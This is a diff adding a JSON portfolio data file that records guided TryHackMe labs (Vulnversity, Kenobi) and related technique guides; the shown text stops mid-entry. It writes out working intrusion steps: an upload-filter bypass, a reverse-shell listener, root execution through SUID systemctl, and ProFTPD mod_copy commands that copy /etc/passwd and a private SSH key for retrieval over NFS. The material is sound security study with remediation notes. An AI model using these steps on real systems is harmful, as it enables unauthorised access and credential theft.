@@ -1,0 +1,884 @@
+{
+  "schemaVersion": 1,
+  "labs": [
+    {
+      "id": "tryhackme-vulnversity",
+      "title": "Vulnversity",
+      "platform": "TryHackMe",
+      "date": "2026-11-11",
+      "difficulty": "Easy",
+      "category": "Web + Linux",
+      "status": "Guided practice completed",
+      "independence": "guided",
+      "tags": [
+        "Nmap",
+        "Burp Suite",
+        "File upload",
+        "PHP",
+        "Reverse shell",
+        "SUID",
+        "systemctl",
+        "Linux privilege escalation"
+      ],
+      "summary": "Bypassed a web upload extension filter, obtained a www-data reverse shell, and used SUID-enabled systemctl to demonstrate root command execution.",
+      "attackPath": [
+        {
+          "title": "Discover exposed web application",
+          "detail": "Enumerated services and found an upload form under /internal/ on the lab web server."
+        },
+        {
+          "title": "Investigate upload validation",
+          "detail": "Used Burp Intruder to probe filename extensions; spotted URL encoding of the dot (%2e) in an unsuccessful request and adjusted the payload format. The .phtml upload was then accepted."
+        },
+        {
+          "title": "Gain initial shell",
+          "detail": "Configured a PHP reverse-shell callback to the Kali VPN tun0 address and listened with netcat; trigger produced uid=33(www-data)."
+        },
+        {
+          "title": "Find privileged executable",
+          "detail": "Enumerated Linux permissions and confirmed /bin/systemctl was owned by root with SUID set."
+        },
+        {
+          "title": "Prove root command execution",
+          "detail": "Created a temporary oneshot systemd unit whose ExecStart ran id; output file contained uid=0(root)."
+        },
+        {
+          "title": "Inspect protected data",
+          "detail": "Used the root-executed service to list /root, confirming root.txt existed; practiced the SUID Bash approach. User later marked the room complete."
+        }
+      ],
+      "methodology": "## Approach\n- Locate the exposed web functionality and validate whether the server allows executable file types.\n- Inspect the actual multipart filename Burp sends; do not use the HTTP 200 code alone as proof of a successful upload.\n- Configure the callback to the attacker VPN interface (`tun0`), not to the target or the public IP.\n- Once in the `www-data` context, enumerate local privilege boundaries and verify a suspected misconfiguration through a minimal proof of execution.",
+      "recon": [
+        {
+          "title": "HTTP upload filter",
+          "detail": "The application reported `Extension not allowed` even though Intruder requests returned HTTP 200. Burp sent `filename=\"shell%2ephtml\"` during an unsuccessful extension test.",
+          "commands": [
+            {
+              "label": "Observed multipart filename",
+              "code": "Content-Disposition: form-data; name=\"file\"; filename=\"shell%2ephtml\""
+            },
+            {
+              "label": "Correct literal extension",
+              "code": "Content-Disposition: form-data; name=\"file\"; filename=\"shell.phtml\""
+            }
+          ]
+        },
+        {
+          "title": "Kali VPN and reverse connection",
+          "detail": "The active Kali VPN interface was `tun0`. The PHP script called back to a listener on port 1234, and its shell identified as `www-data`.",
+          "commands": [
+            {
+              "label": "Check VPN address",
+              "code": "ip -4 addr show tun0"
+            },
+            {
+              "label": "Start listener",
+              "code": "nc -lvnp 1234"
+            },
+            {
+              "label": "Observed shell identity",
+              "code": "id",
+              "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+            }
+          ]
+        },
+        {
+          "title": "Root-owned SUID systemctl",
+          "detail": "The permission string was confirmed as `-rwsr-xr-x`, with root as owner.",
+          "commands": [
+            {
+              "label": "Inspect permissions",
+              "code": "ls -l /bin/systemctl",
+              "output": "-rwsr-xr-x 1 root root 996584 Jun 17 2024 /bin/systemctl"
+            }
+          ]
+        },
+        {
+          "title": "Root execution confirmation",
+          "detail": "A temporary systemd service ran `id` as root. This proved root command execution, not that the original reverse shell changed identity.",
+          "commands": [
+            {
+              "label": "Root proof from temporary service",
+              "code": "cat /tmp/cpent-proof-result",
+              "output": "uid=0(root) gid=0(root) groups=0(root)"
+            }
+          ]
+        },
+        {
+          "title": "Protected directory",
+          "detail": "The root-executed service listed `/root`; the listing included `root.txt` (33 bytes). The flag value is deliberately not stored."
+        }
+      ],
+      "findings": [
+        {
+          "title": "Executable upload accepted by web application",
+          "evidence": "A `.phtml` upload succeeded after correcting the transmitted multipart filename, and executing the uploaded PHP produced a `www-data` shell.",
+          "rootCause": "Executable file upload was permitted in a web-accessible location and processed as server-side PHP.",
+          "impact": "Remote code execution with web-service privileges.",
+          "remediation": "Use strict allowlists and verify file content server-side; store uploads outside executable directories; disable script execution for upload paths.",
+          "validation": "Confirm disallowed scripts cannot be uploaded or executed."
+        },
+        {
+          "title": "Root-owned systemctl with SUID bit",
+          "evidence": "`ls -l /bin/systemctl` showed `-rwsr-xr-x ... root root`. A temporary service executed `id` and wrote `uid=0(root)` to a file.",
+          "rootCause": "SUID on a service-management utility allowed privileged service operations to be requested by a lower-privileged user in this lab.",
+          "impact": "Privilege escalation from web-service access to root-level command execution.",
+          "remediation": "Remove the SUID bit from systemctl and audit authorization policy and privileged services.",
+          "validation": "With an unprivileged account, verify custom root service creation and execution are denied."
+        }
+      ],
+      "learnings": [
+        "TCP SYN scan (`-sS`) learns port state from TCP responses without a completed handshake; open does not mean vulnerable.",
+        "Burp Intruder can vary a multipart filename; inspect the raw request because encoded `%2e` may not be treated as a literal extension dot.",
+        "HTTP 200 means the request was handled; the response body determines whether the upload succeeded.",
+        "For a reverse shell, the callback is the reachable Kali VPN address on `tun0`, and the listener port must match.",
+        "SUID on a root-owned executable can confer an effective root identity; privileged operations still depend on the program and authorization.",
+        "systemctl requests service actions; a `.service` unit defines what systemd executes. The proof used output redirected to `/tmp`.",
+        "Root command execution in a separate service is not the same as converting an existing `www-data` shell to root.",
+        "A file readable by mode bits may still be inaccessible when a parent directory lacks traversal permission."
+      ],
+      "difficulties": [
+        "Needed help interpreting the SYN/RST handshake and what closed versus filtered implies.",
+        "Initially the multipart filename used `%2e` instead of a literal dot; identified by inspecting Burp Raw Request.",
+        "Needed guided explanation and command construction for a systemd oneshot service and a privileged shell.",
+        "Actual root flag bytes were not supplied; the user reported finishing the lab."
+      ],
+      "report": "## Outcome\nGuided exploitation chain completed. An executable upload produced a `www-data` reverse shell. A SUID-root `systemctl` executed a temporary service with `uid=0(root)`.\n\n## Confidence / boundaries\nRoot-level command execution was directly verified. The transcript does not contain the final interactive root-shell identity or flag contents, so neither is asserted as independently evidenced. The room was subsequently marked complete by the learner.\n\n## Defensive interpretation\nTwo unrelated controls failed: an upload directory executed attacker-supplied PHP, and a service manager control executable was SUID root. Restricting either step disrupts the demonstrated chain.",
+      "references": [
+        {
+          "label": "TryHackMe Vulnversity",
+          "url": "https://tryhackme.com/room/vulnversity"
+        },
+        {
+          "label": "GTFOBins — systemctl",
+          "url": "https://gtfobins.org/gtfobins/systemctl/"
+        }
+      ]
+    },
+    {
+      "id": "tryhackme-kenobi",
+      "title": "Kenobi",
+      "platform": "TryHackMe",
+      "date": "2026-11-12",
+      "difficulty": "Easy",
+      "category": "Network services + Linux",
+      "status": "Guided practice completed",
+      "independence": "guided",
+      "tags": [
+        "Nmap",
+        "SMB",
+        "smbclient",
+        "FTP",
+        "ProFTPD",
+        "mod_copy",
+        "SearchSploit",
+        "NFS",
+        "SSH",
+        "SUID",
+        "strings",
+        "PATH hijacking"
+      ],
+      "summary": "Combined anonymous SMB disclosure, ProFTPD mod_copy, an NFS export, and SSH key authentication; investigated a custom SUID menu executable and PATH hijacking.",
+      "attackPath": [
+        {
+          "title": "Enumerate the network",
+          "detail": "A full TCP scan found 11 open ports, including FTP (21), SSH (22), SMB (139/445), RPC/NFS (111/2049) and HTTP (80)."
+        },
+        {
+          "title": "Read anonymous SMB share",
+          "detail": "Nmap SMB scripts returned no share list, but an anonymous SMB connection exposed log.txt with Kenobi SSH-key paths and configuration clues."
+        },
+        {
+          "title": "Research FTP version",
+          "detail": "Nmap identified ProFTPD 1.3.5. SearchSploit listed mod_copy exploit material; examined the file-copy technique instead of assuming version alone proves vulnerability."
+        },
+        {
+          "title": "Verify FTP copy operations",
+          "detail": "The FTP service exposed SITE CPFR/CPTO. A source-file probe was accepted; the learner later reported the SSH key copy succeeded."
+        },
+        {
+          "title": "Retrieve file through NFS",
+          "detail": "NFS exported /var. Mounted it, and used the FTP service to copy the key into /var/tmp; accessed the file through the mount."
+        },
+        {
+          "title": "Authenticate as kenobi",
+          "detail": "Copied the key to Kali with restrictive permissions and successfully logged into SSH as kenobi."
+        },
+        {
+          "title": "Investigate local escalation",
+          "detail": "SUID enumeration uncovered /usr/bin/menu. `strings` revealed `setuid`, `system` and commands resolved through PATH; a PATH-hijack workflow was practiced with guidance, but final root-shell output was not supplied."
+        }
+      ],
+      "methodology": "## Approach\n- Enumerate all TCP ports and service versions first, rather than guessing the correct exploit.\n- Treat anonymous access, file paths and service configuration as clues that may connect services.\n- Research version-specific public vulnerability material; validate the required server behavior before relying on an exploit.\n- Use evidence from SMB, FTP and NFS to construct a multi-service path to SSH authentication.\n- After a user shell, look for unusual SUID executables and understand program behavior before attempting escalation.",
+      "recon": [
+        {
+          "title": "TCP discovery",
+          "detail": "11 open TCP ports were observed. Several high-numbered ports were also present; their services were not positively identified in the provided scan.",
+          "commands": [
+            {
+              "label": "Observed scan command",
+              "code": "nmap -sS -p- <TARGET_IP>",
+              "output": "21/tcp    open  ftp\n22/tcp    open  ssh\n80/tcp    open  http\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n2049/tcp  open  nfs\n36365/tcp open  unknown\n43241/tcp open  unknown\n43671/tcp open  unknown\n57195/tcp open  unknown"
+            }
+          ]
+        },
+        {
+          "title": "SMB shares and log.txt",
+          "detail": "The SMB NSE scripts produced no share enumeration output. An anonymous SMB session worked, and `log.txt` included `/home/kenobi/.ssh/id_rsa` and an anonymous share definition. The ProFTPD sample configuration is a clue, not proof of the active configuration.",
+          "commands": [
+            {
+              "label": "NSE attempt",
+              "code": "nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET_IP>"
+            },
+            {
+              "label": "Share list without password",
+              "code": "smbclient -L //<TARGET_IP> -N"
+            },
+            {
+              "label": "Retrieve share file from SMB prompt",
+              "code": "ls\nget log.txt"
+            }
+          ]
+        },
+        {
+          "title": "FTP service version and research",
+          "detail": "Nmap identified ProFTPD 1.3.5. The local SearchSploit listing included files 37262.rb, 36803.py, 49908.py and 36742.txt.",
+          "commands": [
+            {
+              "label": "Version probe",
+              "code": "nmap -sV -p 21 <TARGET_IP>",
+              "output": "21/tcp open ftp ProFTPD 1.3.5"
+            },
+            {
+              "label": "Research known exploit material",
+              "code": "searchsploit \"proftpd 1.3.5\""
+            },
+            {
+              "label": "Read file-copy reference",
+              "code": "searchsploit -x linux/remote/36742.txt"
+            }
+          ]
+        },
+        {
+          "title": "FTP SITE functionality",
+          "detail": "The student reported that `SITE HELP` included CPFR and CPTO and `SITE CPFR /etc/passwd` returned the anticipated positive source response. The separate SSH-key copy was reported successful.",
+          "commands": [
+            {
+              "label": "Connect to FTP control channel",
+              "code": "nc -nv <TARGET_IP> 21"
+            },
+            {
+              "label": "Test copy feature",
+              "code": "SITE HELP\nSITE CPFR /etc/passwd"
+            },
+            {
+              "label": "Lab key copy sequence",
+              "code": "SITE CPFR /home/kenobi/.ssh/id_rsa\nSITE CPTO /var/tmp/id_rsa"
+            }
+          ]
+        },
+        {
+          "title": "NFS export and key retrieval",
+          "detail": "The NFS export list included `/var`; the `/var` mount exposed `/var/tmp`. SSH authentication with the copied key succeeded.",
+          "commands": [
+            {
+              "label": "List exports",
+              "code": "showmount -e <TARGET_IP>"
+            },
+            {
+              "label": "Mount exported path",
+              "code": "sudo mkdir -p /mnt/kenobi\nsudo mount -t nfs <TARGET_IP>:/var /mnt/kenobi"
+            },
+            {
+              "label": "Prepare local key and SSH",
+              "code": "cp /mnt/kenobi/tmp/id_rsa ~/kenobi_id_rsa\nchmod 600 ~/kenobi_id_rsa\nssh -i ~/kenobi_id_rsa kenobi@<TARGET_IP>"
+            }
+          ]
+        },
+        {
+          "title": "SUID menu and PATH",
+          "detail": "`strings` displayed `setuid`, `system`, `curl -I localhost`, `uname -r`, and `ifconfig`. The real `curl` resolved to `/usr/bin/curl`. A PATH replacement technique was taught; final root identity output was not shared.",
+          "commands": [
+            {
+              "label": "Find SUID executables",
+              "code": "find / -perm -u=s -type f 2>/dev/null"
+            },
+            {
+              "label": "Inspect suspicious program",
+              "code": "strings /usr/bin/menu"
+            },
+            {
+              "label": "Inspect PATH resolution",
+              "code": "echo \"$PATH\"\nwhich curl",
+              "output": "/usr/bin/curl"
+            }
+          ]
+        }
+      ],
+      "findings": [
+        {
+          "title": "Anonymous SMB disclosure",
+          "evidence": "Anonymous SMB access revealed `log.txt` containing SSH key locations and service configurations.",
+          "rootCause": "The `[anonymous]` Samba share allowed guest access to operational information.",
+          "impact": "Information disclosure helped construct an attack path into the machine.",
+          "remediation": "Restrict guest shares and remove sensitive administrative files from anonymously accessible locations.",
+          "validation": "Verify anonymous users cannot read internal configuration or credential-location information."
+        },
+        {
+          "title": "Unauthenticated ProFTPD mod_copy file copying",
+          "evidence": "ProFTPD 1.3.5 exposed `SITE CPFR` and `SITE CPTO`; a server-side copy of an SSH private key into `/var/tmp` was reported successful.",
+          "rootCause": "Affected `mod_copy` behavior permitted file copying on the server without FTP authentication in the lab.",
+          "impact": "Sensitive private-key material became available through another exported path.",
+          "remediation": "Update or patch ProFTPD, disable unneeded mod_copy, and restrict filesystem privileges.",
+          "validation": "Verify unauthenticated SITE copy operations no longer succeed."
+        },
+        {
+          "title": "NFS export enabled retrieval of copied key",
+          "evidence": "`showmount -e` returned `/var`; mounting it enabled access to the copied file in `/var/tmp`. SSH access as kenobi was then confirmed.",
+          "rootCause": "Network-accessible export combined with an unsafe server-side file-copy operation.",
+          "impact": "Compromise of an interactive Linux user account via SSH key.",
+          "remediation": "Limit NFS exports to necessary directories and authorized clients; protect sensitive copied material and key files.",
+          "validation": "Verify the export is restricted and sensitive files are not retrievable."
+        }
+      ],
+      "learnings": [
+        "An Nmap port scan identifies possible attack surface; NSE scripts can yield no results despite a reachable SMB service.",
+        "SMB guest access can leak file paths and configuration details; those details are clues, not automatic exploits.",
+        "Identify an exact service version, research applicable vulnerabilities, and validate actual behavior before exploitation.",
+        "ProFTPD SITE CPFR and CPTO perform server-side file copies; their unauthenticated use was tested in this lab.",
+        "NFS exports can be enumerated with showmount and mounted to a local path; network filesystem access follows separate permission rules.",
+        "SSH private-key authentication uses `ssh -i`; copying a key locally requires restrictive file permissions such as chmod 600.",
+        "A nonstandard SUID binary is worth examining; strings reveals clues about referenced functions and invoked commands, but does not prove exploitability.",
+        "`PATH` is searched left to right. `export PATH=/home/kenobi/tools/:$PATH` adds a preferred directory while retaining previous entries.",
+        "Privilege-escalation discovery and independent shell-script construction still need deliberate practice."
+      ],
+      "difficulties": [
+        "Initial smb-enum-shares and smb-enum-users scripts returned no shares; an smbclient fallback resolved it.",
+        "Needed guided prompting to choose ProFTPD, connect information from SMB and NFS, and recognize an attack point.",
+        "Needed explanation of exploit database entries, FTP SITE commands, NFS mounting and SUID PATH hijacking.",
+        "User can explain high-level attack chains but said they are not yet confident constructing shell scripts/commands independently.",
+        "A post-hijack `id` output confirming an effective-root interactive shell was not provided."
+      ],
+      "report": "## Outcome\nAnonymous SMB gave access to `log.txt`, which disclosed a private-key path. Nmap identified ProFTPD 1.3.5; the lab's FTP server accepted mod_copy commands. A key copy into an NFS-exported path was reported successful, and SSH login as `kenobi` was confirmed.\n\n## Local escalation investigation\nA nonstandard root SUID binary, `/usr/bin/menu`, appeared in the enumeration. `strings` exposed `setuid`, `system`, and relative command names. A PATH hijack was taught and its mechanism discussed, but the final execution identity was not recorded in the supplied transcript. Therefore the site does not claim independently verified root access from that step.\n\n## Learning gap\nThe user explicitly requested more practice independently identifying attack points and constructing Bash commands rather than being given the next exploit.",
+      "references": [
+        {
+          "label": "TryHackMe Kenobi",
+          "url": "https://tryhackme.com/room/kenobi"
+        },
+        {
+          "label": "Exploit Database",
+          "url": "https://www.exploit-db.com/"
+        }
+      ]
+    }
+  ],
+  "guides": [
+    {
+      "id": "recon-workflow",
+      "title": "Attack-point discovery workflow",
+      "date": "2026-11-12",
+      "category": "Methodology",
+      "kind": "workflow",
+      "summary": "Enumerate broadly, connect findings, investigate promising services, and validate instead of guessing.",
+      "tags": [
+        "Enumeration",
+        "Research",
+        "Attack path"
+      ],
+      "takeaways": [
+        "An open port is a lead, not proof of a vulnerability.",
+        "Do not treat a matching CVE as confirmed exploitation.",
+        "Ask: what do I control, what can I read/write, and what new boundary could this cross?"
+      ],
+      "content": "## Practical decision loop\n1. **Discover**: list ports, services, web routes and shares.\n2. **Identify**: probe versions, permissions, authentication and exposed files.\n3. **Research**: use local exploit references and vendor information for the actual version/configuration.\n4. **Hypothesize**: explain which condition could be exploited and what additional access it would provide.\n5. **Validate**: test the suspected weakness inside the lab and record actual responses.\n6. **Chain**: ask whether one service's access or output helps reach another service.\n\nAt each step, separate observed facts from guesses. The Kenobi chain combined an SMB path disclosure, ProFTPD copying, an NFS export and SSH authentication. The learner said independently selecting the next attack point is still a priority for practice.",
+      "examples": [
+        {
+          "title": "Identify software on discovered ports",
+          "language": "bash",
+          "code": "nmap -sV -sC -p 21,22,80,139,445,2049 <TARGET_IP>",
+          "explanation": "Map service identity and default script output before choosing a hypothesis."
+        }
+      ],
+      "pitfalls": [
+        "A walkthrough can hide the discovery work.",
+        "A sample config file does not guarantee the live service uses the same configuration."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity",
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "nmap-syn-scan",
+      "title": "Nmap TCP scan basics",
+      "date": "2026-11-12",
+      "category": "Networking",
+      "kind": "tool",
+      "summary": "Interpret TCP open, closed and filtered states and use service detection after port discovery.",
+      "tags": [
+        "Nmap",
+        "TCP"
+      ],
+      "takeaways": [
+        "An RST normally suggests a closed TCP port but some firewalls send resets.",
+        "Open only means a service is accepting connection attempts."
+      ],
+      "content": "## Response logic\n- **Open**: SYN generally receives SYN/ACK.\n- **Closed**: SYN generally receives RST.\n- **Filtered**: probes may get no response or certain ICMP errors; a firewall may also actively reject.\n\n`-sS` performs a TCP SYN scan without a normal completed connection; `-sT` uses the OS connect API. Both are detectable. `-p-` scans the full TCP port range, while `-sV` identifies the software behind an open port.",
+      "examples": [
+        {
+          "title": "Full TCP discovery",
+          "language": "bash",
+          "code": "sudo nmap -sS -p- <TARGET_IP>",
+          "explanation": "Enumerate all TCP ports in an authorized lab."
+        },
+        {
+          "title": "Version identification",
+          "language": "bash",
+          "code": "nmap -sV -p 21 <TARGET_IP>",
+          "explanation": "Probe the detected service and version."
+        }
+      ],
+      "pitfalls": [
+        "A banner may be misleading or reflect backported patches."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity",
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "burp-upload-fuzzing",
+      "title": "Burp Intruder: upload extension checks",
+      "date": "2026-11-12",
+      "category": "Web applications",
+      "kind": "tool",
+      "summary": "Inspect the actual multipart filename and application response when testing upload restrictions.",
+      "tags": [
+        "Burp Suite",
+        "Intruder",
+        "Multipart"
+      ],
+      "takeaways": [
+        "The actual outgoing HTTP request matters more than the payload list you intended."
+      ],
+      "content": "## The Vulnversity pitfall\nA request contained `filename=\"shell%2ephtml\"`. `%2e` is the encoded dot; the multipart upload handler did not accept it as the intended `.phtml` extension. A literal `filename=\"shell.phtml\"` was needed.\n\nHTTP **200** alone was not proof of acceptance; the body said `Extension not allowed`. Place the payload marker around the extension text or disable dot encoding, then inspect the **Raw Request** and **Response**.",
+      "examples": [
+        {
+          "title": "Correct multipart filename",
+          "language": "http",
+          "code": "Content-Disposition: form-data; name=\"file\"; filename=\"shell.phtml\"",
+          "explanation": "A literal extension in the filename parameter."
+        }
+      ],
+      "pitfalls": [
+        "The endpoint may return HTTP 200 for both success and failure."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity"
+      ],
+      "references": []
+    },
+    {
+      "id": "php-reverse-shell",
+      "title": "PHP reverse shell and VPN callback",
+      "date": "2026-11-12",
+      "category": "Initial access",
+      "kind": "technique",
+      "summary": "The server calls back to a listener on the reachable Kali VPN address.",
+      "tags": [
+        "PHP",
+        "netcat",
+        "tun0"
+      ],
+      "takeaways": [
+        "Uploading a PHP file and executing it are separate steps.",
+        "A reverse shell inherits the web service process permissions."
+      ],
+      "content": "## Connection direction\nA reverse shell makes a connection **from the target to Kali**. In the Vulnversity lab, the PHP script called `fsockopen($ip, $port, ...)` and then launched a shell through `proc_open()`.\n\nThe callback address was the Kali `tun0` VPN address, not the target address or a public IP. Matching the listener port was necessary. The shell ran as `www-data`, not root.",
+      "examples": [
+        {
+          "title": "Find the VPN address",
+          "language": "bash",
+          "code": "ip -4 addr show tun0",
+          "explanation": "Find the IP reachable from the TryHackMe lab."
+        },
+        {
+          "title": "Listen for a connection",
+          "language": "bash",
+          "code": "nc -lvnp 1234",
+          "explanation": "Start a TCP listener matching the PHP callback port."
+        }
+      ],
+      "pitfalls": [
+        "Verify that the VPN tunnel is active.",
+        "A non-interactive /bin/sh may lack job control and a TTY."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity"
+      ],
+      "references": []
+    },
+    {
+      "id": "linux-suid",
+      "title": "SUID and Linux privilege boundaries",
+      "date": "2026-11-12",
+      "category": "Linux privilege escalation",
+      "kind": "concept",
+      "summary": "A root-owned SUID executable can run with effective root privileges; the program still needs unsafe behavior.",
+      "tags": [
+        "SUID",
+        "Permissions",
+        "find"
+      ],
+      "takeaways": [
+        "Real UID and effective UID can differ.",
+        "Ownership plus execute permission is not the same as SUID."
+      ],
+      "content": "## Permissions\n`-rwsr-xr-x root root /path/program` shows an `s` in the owner's execute position. SUID typically makes the executable process run with its owner's effective UID, while the invoking user's real UID remains unchanged.\n\nThis does **not** automatically make every SUID program exploitable. Normal programs like `passwd` legitimately require elevated operations. Nonstandard binaries such as Kenobi's `/usr/bin/menu` deserve closer investigation.",
+      "examples": [
+        {
+          "title": "List SUID files",
+          "language": "bash",
+          "code": "find / -perm -u=s -type f 2>/dev/null",
+          "explanation": "Find regular files with user SUID set while suppressing error messages."
+        },
+        {
+          "title": "Check owner and mode",
+          "language": "bash",
+          "code": "ls -l /bin/systemctl",
+          "explanation": "Read the s position and root owner."
+        }
+      ],
+      "pitfalls": [
+        "Many SUID binaries are legitimate."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity",
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "systemctl-service",
+      "title": "systemctl, oneshot services and root proofs",
+      "date": "2026-11-12",
+      "category": "Linux privilege escalation",
+      "kind": "technique",
+      "summary": "A unit file defines a command; systemctl asks systemd to start it.",
+      "tags": [
+        "systemctl",
+        "systemd",
+        "SUID"
+      ],
+      "takeaways": [
+        "Privileged command execution and an interactive root shell are distinct.",
+        "Use the minimum necessary proof and remove test artifacts after a lab."
+      ],
+      "content": "## Mechanism learned in Vulnversity\nA `.service` file has an `ExecStart` instruction describing what systemd should run. In the lab, root-owned SUID `systemctl` enabled privileged service actions. A temporary oneshot service wrote the output of `id` to a file in `/tmp`.\n\nThe output contained `uid=0(root)`: proof the service command ran as root. The original `www-data` shell did not automatically become root. `daemon-reload` is used when changing unit definitions, and `start`/`restart` runs a service.",
+      "examples": [
+        {
+          "title": "Minimal proof command in a unit",
+          "language": "ini",
+          "code": "[Service]\nType=oneshot\nExecStart=/bin/sh -c 'id > /tmp/cpent-proof-result'",
+          "explanation": "Unit excerpt used for a harmless execution identity check."
+        },
+        {
+          "title": "Check proof output",
+          "language": "bash",
+          "code": "cat /tmp/cpent-proof-result",
+          "explanation": "Look for the effective execution identity."
+        }
+      ],
+      "pitfalls": [
+        "Do not leave SUID Bash copies or temporary privileged services behind."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity"
+      ],
+      "references": []
+    },
+    {
+      "id": "smb-enumeration",
+      "title": "SMB guest enumeration",
+      "date": "2026-11-12",
+      "category": "Network services",
+      "kind": "tool",
+      "summary": "List SMB shares and inspect anonymous content; use a fallback if NSE scripts show nothing.",
+      "tags": [
+        "SMB",
+        "NSE",
+        "smbclient"
+      ],
+      "takeaways": [
+        "No script output is not proof there are no shares.",
+        "Read retrieved files for usernames, paths and references to other services."
+      ],
+      "content": "## Practical approach\nSMB commonly uses TCP 445 or 139. Kenobi's `smb-enum-shares.nse` and `smb-enum-users.nse` produced no share output, even though the ports were open. A separate `smbclient` attempt without a password worked.\n\nAn anonymous share contained `log.txt`, which exposed internal configuration clues and an SSH key path. Guest access is therefore a potential information-disclosure issue.",
+      "examples": [
+        {
+          "title": "SMB script attempt",
+          "language": "bash",
+          "code": "nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET_IP>",
+          "explanation": "Initial NSE attempt."
+        },
+        {
+          "title": "List shares as guest",
+          "language": "bash",
+          "code": "smbclient -L //<TARGET_IP> -N",
+          "explanation": "Use the Samba client without a password prompt."
+        },
+        {
+          "title": "Share-interactive commands",
+          "language": "bash",
+          "code": "ls\nget log.txt",
+          "explanation": "List and download a file from an smbclient share session."
+        }
+      ],
+      "pitfalls": [
+        "A sample configuration in a retrieved log is not proof of a live setting."
+      ],
+      "sourceLabs": [
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "searchsploit-research",
+      "title": "SearchSploit and exploit validation",
+      "date": "2026-11-12",
+      "category": "Vulnerability research",
+      "kind": "tool",
+      "summary": "Search by product/version, inspect references, then test requirements rather than blindly running an exploit.",
+      "tags": [
+        "SearchSploit",
+        "ProFTPD"
+      ],
+      "takeaways": [
+        "A matching result is not a confirmed vulnerability.",
+        "Understand what access or file operation the candidate exploit provides."
+      ],
+      "content": "## Kenobi example\nNmap identified `ProFTPD 1.3.5`. SearchSploit listed four relevant records: command-execution variants and a file-copy reference. The file-copy reference was relevant because the SMB log had disclosed a private-key path.\n\nResearch supplied a hypothesis. The server's actual `SITE` response and subsequent reported copy established whether the behavior existed in the lab.",
+      "examples": [
+        {
+          "title": "Search local exploit references",
+          "language": "bash",
+          "code": "searchsploit \"proftpd 1.3.5\"",
+          "explanation": "Look up version-specific exploit material."
+        },
+        {
+          "title": "Read a reference",
+          "language": "bash",
+          "code": "searchsploit -x linux/remote/36742.txt",
+          "explanation": "Examine details without blindly executing a script."
+        }
+      ],
+      "pitfalls": [
+        "Check enabled modules, filesystem permissions and potential patches."
+      ],
+      "sourceLabs": [
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "ftp-mod-copy",
+      "title": "ProFTPD SITE CPFR / CPTO",
+      "date": "2026-11-12",
+      "category": "Network services",
+      "kind": "technique",
+      "summary": "FTP SITE carries server-specific commands; mod_copy can copy files entirely on the server.",
+      "tags": [
+        "FTP",
+        "ProFTPD",
+        "mod_copy"
+      ],
+      "takeaways": [
+        "Server-side copying does not transfer the file to Kali.",
+        "The FTP daemon must have permission to read the source and write the destination."
+      ],
+      "content": "## Protocol behavior\n`SITE` introduces a site-specific FTP command. ProFTPD's `mod_copy` provides `CPFR` (**copy from**) and `CPTO` (**copy to**). In affected configurations, FTP clients may invoke these without authenticating.\n\nA `350` response indicates a source accepted and a destination is expected; `250` means the operation was successful. Kenobi's vulnerable service exposed the commands, enabling an SSH key to be copied to a path that another service exposed.",
+      "examples": [
+        {
+          "title": "Talk to FTP without a special client",
+          "language": "bash",
+          "code": "nc -nv <TARGET_IP> 21",
+          "explanation": "FTP control commands are plain text over a TCP connection."
+        },
+        {
+          "title": "Inspect SITE functionality",
+          "language": "text",
+          "code": "SITE HELP\nSITE CPFR /etc/passwd",
+          "explanation": "Identify supported site-specific commands and test source acceptance."
+        }
+      ],
+      "pitfalls": [
+        "A recognized SITE command alone does not prove exploitable copying."
+      ],
+      "sourceLabs": [
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "nfs-mounting",
+      "title": "NFS export discovery and mounting",
+      "date": "2026-11-12",
+      "category": "Network services",
+      "kind": "tool",
+      "summary": "NFS exposes server directories as mountable filesystems with their own access controls.",
+      "tags": [
+        "NFS",
+        "showmount",
+        "mount"
+      ],
+      "takeaways": [
+        "The local mount point corresponds to the remote export path.",
+        "Files still have ownership and permission controls."
+      ],
+      "content": "## Kenobi connection\n`showmount -e` listed `/var` as an exported path. Kali mounted this path under `/mnt/kenobi`. A file copied by the FTP service into `/var/tmp` became visible at `/mnt/kenobi/tmp`.\n\nThis demonstrates how two otherwise separate services can be chained: FTP places a file; NFS provides access to the destination.",
+      "examples": [
+        {
+          "title": "Discover exports",
+          "language": "bash",
+          "code": "showmount -e <TARGET_IP>",
+          "explanation": "Request NFS-exported directories."
+        },
+        {
+          "title": "Mount an export",
+          "language": "bash",
+          "code": "sudo mkdir -p /mnt/kenobi\nsudo mount -t nfs <TARGET_IP>:/var /mnt/kenobi",
+          "explanation": "Attach remote /var to a local mount point."
+        }
+      ],
+      "pitfalls": [
+        "NFS export visibility does not guarantee read or write permission for every file."
+      ],
+      "sourceLabs": [
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "ssh-private-key",
+      "title": "SSH key-based authentication",
+      "date": "2026-11-12",
+      "category": "Network services",
+      "kind": "technique",
+      "summary": "A usable private key can authenticate a user when its matching public key is authorized.",
+      "tags": [
+        "SSH",
+        "Permissions"
+      ],
+      "takeaways": [
+        "Knowing a key path is different from possessing the private key.",
+        "A private key must match an authorized public key; possession alone is not always sufficient."
+      ],
+      "content": "## Kenobi example\n`log.txt` revealed a path ending in `.ssh/id_rsa`. The private key itself was later obtained through the ProFTPD/NFS chain. The user successfully logged in as `kenobi` using `ssh -i`.\n\nKeeping the private key's local file permissions restrictive (for example `chmod 600`) matters because OpenSSH may refuse insecurely accessible key files.",
+      "examples": [
+        {
+          "title": "Use a retrieved lab key",
+          "language": "bash",
